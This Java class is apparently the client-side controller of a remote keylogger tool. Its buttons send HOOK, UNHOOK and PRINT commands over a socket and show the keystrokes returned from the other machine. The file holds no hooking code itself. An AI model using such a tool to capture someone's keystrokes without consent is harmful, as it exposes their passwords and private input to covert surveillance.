package clientPackage;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;

import javax.swing.AbstractButton;
import javax.swing.table.DefaultTableModel;

public class KeyStroke implements ActionListener{
	
	private KeyStrokeDesign keyStrokeDesign;
	private Socket socket;
	private BufferedReader reader;
	private PrintWriter out;
	public String line = "";

	public KeyStroke(KeyStrokeDesign keyStrokeDesign, Socket socket, BufferedReader reader, PrintWriter out) {
		this.keyStrokeDesign = keyStrokeDesign;
		this.socket = socket;
		this.reader = reader;
		this.out = out;
	}

	public void actionPerformed(ActionEvent e) {
		if (e.getSource() == keyStrokeDesign.btnHook) {
			String request = "HOOK";
			out.println(request);
			out.flush();
		}
		
		if (e.getSource() == keyStrokeDesign.btnUnhook) {
			String request = "UNHOOK";
			out.println(request);
			out.flush();
		}
		
		if (e.getSource() == keyStrokeDesign.btnPrint) {
			String request = "PRINT";
			out.println(request);
			out.flush();
			
			try {
				line = reader.readLine();
				
				keyStrokeDesign.Box.setText(keyStrokeDesign.Box.getText() + line);
				
				line = "";
			} catch (IOException e1) {
				e1.printStackTrace();
			}
			
			
		}
		
		if (e.getSource() == keyStrokeDesign.btnRemove) {
			keyStrokeDesign.Box.setText("");
		}
		
	}

}
